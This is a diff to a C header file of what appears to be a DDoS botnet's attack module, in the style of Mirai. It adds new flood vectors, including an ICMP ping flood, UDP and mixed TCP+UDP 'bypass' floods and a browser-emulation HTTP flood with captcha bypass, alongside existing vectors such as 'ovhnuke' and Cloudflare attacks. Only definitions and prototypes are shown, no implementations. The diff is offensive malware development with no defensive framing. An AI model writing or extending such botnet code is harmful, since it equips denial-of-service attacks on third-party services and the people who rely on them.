@@ -43,20 +43,23 @@
 #define ATK_VEC_TCPBYPASS   33  /* tcpbypass */
 #define ATK_VEC_NFLAG       34  /* nflag */
 #define ATK_VEC_OVHNUKE     35  /* ovhnuke */
-#define ATK_VEC_RAW         36  /* raw */
-/* Reserved 37-39 */
+/* Reserved 36-39 */
 
 /* Special Attacks (40-49) */
 #define ATK_VEC_VSE         40  /* vse */
 #define ATK_VEC_DNS         41  /* dns */
 #define ATK_VEC_GREIP       42  /* greip */
 #define ATK_VEC_GREETH      43  /* greeth */
-/* Reserved 44-49 */
+#define ATK_VEC_HOMESLAM    44  /* homeslam - ICMP ping flood */
+#define ATK_VEC_UDPBYPASS   45  /* udpbypass - UDP bypass flood */
+#define ATK_VEC_MIXED       46  /* mixed - Combined TCP+UDP bypass */
+/* Reserved 47-49 */
 
 /* HTTP/HTTPS (50-59) */
 #define ATK_VEC_HTTP        50  /* http */
 #define ATK_VEC_HTTPS       51  /* https */
-/* Reserved 52-59 */
+#define ATK_VEC_BROWSEREM   52  /* browserem - Browser emulation with captcha bypass */
+/* Reserved 53-59 */
 
 /* Cloudflare/Other (60+) */
 #define ATK_VEC_CF          60  /* cf */
@@ -96,6 +99,8 @@
 #define ATK_OPT_MAXLEN          27  /* maxlen */
 #define ATK_OPT_PAYLOAD         28  /* payload */
 #define ATK_OPT_REPEAT          29  /* repeat */
+#define ATK_OPT_URL             30  /* url - Full HTTP/HTTPS URL */
+#define ATK_OPT_HTTPS           31  /* https - Use HTTPS/SSL */
 
 /* ============================================================================
  * ATTACK STRUCTURES
@@ -165,10 +170,14 @@ static void attack_udp_vse(ipv4_t, uint8_t, struct attack_target *, int, struct 
 static void attack_udp_dns(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_homeslam(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_udpbypass(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_mixed(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 
 /* Attack method declarations - HTTP */
 static void attack_http(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_https(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 static void attack_cf(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+static void attack_browserem(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 
 #endif
